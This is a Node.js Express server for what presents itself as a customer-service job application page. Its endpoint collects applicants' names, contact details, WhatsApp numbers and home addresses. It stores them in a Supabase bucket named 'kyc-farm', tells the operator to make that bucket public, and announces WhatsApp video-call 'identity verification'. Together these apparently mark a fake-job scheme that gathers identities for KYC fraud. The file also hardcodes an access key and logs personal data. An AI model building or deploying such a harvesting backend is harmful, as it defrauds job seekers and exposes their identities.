const express = require('express');
const cors = require('cors');
const path = require('path');
const multer = require('multer');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 8000;

// Supabase configuration
const supabaseUrl = process.env.SUPABASE_URL || 'https://xduxzptxhvvlmiwxqhxz.supabase.co';
const supabaseKey = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhkdXh6cHR4aHZ2bG1pd3hxaHh6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA3NzM1MDQsImV4cCI6MjA2NjM0OTUwNH0.nEPp5-ke8-aCNJPuCcSI8S319s7_QZxKgEPb2jkHt20';
const supabase = createClient(supabaseUrl, supabaseKey);



// Configure multer for form data handling
const upload = multer();

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files - serve everything from root
app.use(express.static(__dirname));



// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  try {
    res.json({ 
      status: 'OK', 
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      port: PORT,
      uptime: process.uptime(),
      supabaseConfigured: !!(process.env.SUPABASE_URL && process.env.SUPABASE_ANON_KEY)
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(500).json({
      status: 'ERROR',
      message: 'Health check failed',
      error: error.message
    });
  }
});

// Application submission endpoint
app.post('/api/submit-application', upload.none(), async (req, res) => {
  try {
    console.log('=== REQUEST DEBUG INFO ===');
    console.log('Content-Type:', req.headers['content-type']);
    console.log('req.body keys:', Object.keys(req.body));
    console.log('req.body:', req.body);
    console.log('========================');
    
    const { 
      email, 
      firstName, 
      lastName, 
      phone, 
      whatsapp, 
      street, 
      city, 
      state, 
      zipCode, 
      country, 
      experience, 
      schedule 
    } = req.body;
    
    // Create folder name
    const fullName = `${firstName} ${lastName}`;
    const safeFolderName = fullName
      .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
      .replace(/\s+/g, '-') // Replace spaces with hyphens
      .toLowerCase();
    
    const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
    const folderName = `${timestamp}_${safeFolderName}`;
    
    // Create application info
    const applicationInfo = {
      timestamp: new Date().toISOString(),
      applicantName: `${firstName} ${lastName}`,
      email: email,
      phone: phone,
      whatsapp: whatsapp,
      address: {
        street: street,
        city: city,
        state: state,
        zipCode: zipCode,
        country: country,
        full: `${street}, ${city}, ${state} ${zipCode}, ${country}`
      },
      experience: experience,
      schedule: schedule,
      applicationId: 'APP-' + Date.now(),
      folderName: folderName,
      status: 'Pending WhatsApp Contact'
    };
    
    // Save application info to Supabase Storage as text file
    const infoText = `CUSTOMER SERVICE APPLICATION
========================================

Applicant Information:
- Full Name: ${applicationInfo.applicantName}
- Email: ${applicationInfo.email}
- Phone: ${applicationInfo.phone}
- WhatsApp: ${applicationInfo.whatsapp}
- Address: ${applicationInfo.address.full}
- Experience Level: ${applicationInfo.experience}
- Preferred Schedule: ${applicationInfo.schedule}

Application Details:
- Application ID: ${applicationInfo.applicationId}
- Submission Date: ${applicationInfo.timestamp}
- Folder: ${folderName}

Next Steps:
- Representative will contact via WhatsApp within 48-72 hours
- Identity verification will be conducted via WhatsApp video call
- Interview will be scheduled after successful verification
- Hiring and onboarding process will begin if all goes well

Status: ${applicationInfo.status}
========================================`;

    // Upload application info to Supabase
    const infoBuffer = Buffer.from(infoText, 'utf8');
    const infoFilePath = `applications/${folderName}/application-info.txt`;
    
    const { data: infoUpload, error: infoError } = await supabase.storage
      .from('kyc-farm')
      .upload(infoFilePath, infoBuffer, {
        contentType: 'text/plain',
        upsert: false
      });

    if (infoError) {
      console.error('Failed to upload application info:', infoError);
      console.error('⚠️  SUPABASE SETUP REQUIRED: Please ensure the kyc-farm bucket allows public uploads');
      console.error('   Go to Supabase Dashboard > Storage > kyc-farm bucket > Settings > Make bucket public');
    }

    // Get public URL for application info
    const { data: { publicUrl: infoUrl } } = supabase.storage
      .from('kyc-farm')
      .getPublicUrl(infoFilePath);
    
    console.log('=== New Application Received ===');
    console.log('Applicant:', applicationInfo.applicantName);
    console.log('Folder Created:', folderName);
    console.log('Email:', email);
    console.log('Phone:', phone);
    console.log('WhatsApp:', whatsapp);
    console.log('Address:', applicationInfo.address.full);
    console.log('- Application Info:', infoUrl);
    console.log('================================');
    
    // Simulate processing time
    setTimeout(() => {
      res.json({ 
        success: true, 
        message: 'Application submitted successfully! A representative will contact you via WhatsApp within 48-72 hours.',
        applicationId: applicationInfo.applicationId,
        applicantFolder: folderName,
        infoUrl: infoUrl,
        nextSteps: [
          'Keep your WhatsApp active and ready to receive messages',
          'A representative will contact you within 48-72 hours',
          'Identity verification will be conducted via WhatsApp video call',
          'Interview will be scheduled after successful verification',
          'Hiring and onboarding will begin if all goes well'
        ]
      });
    }, 1500);
    
  } catch (error) {
    console.error('Application submission error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'There was an error processing your application. Please try again.' 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error. Please try again later.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Customer Service Landing Page Server running on port ${PORT}`);
  console.log(`📍 Local URL: http://localhost:${PORT}`);
  console.log(`📁 Serving static files from: ${__dirname}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔧 Railway Deploy: ${process.env.RAILWAY_ENVIRONMENT_NAME || 'local'}`);
  console.log(`✅ Server startup complete - Ready to accept connections`);
}); 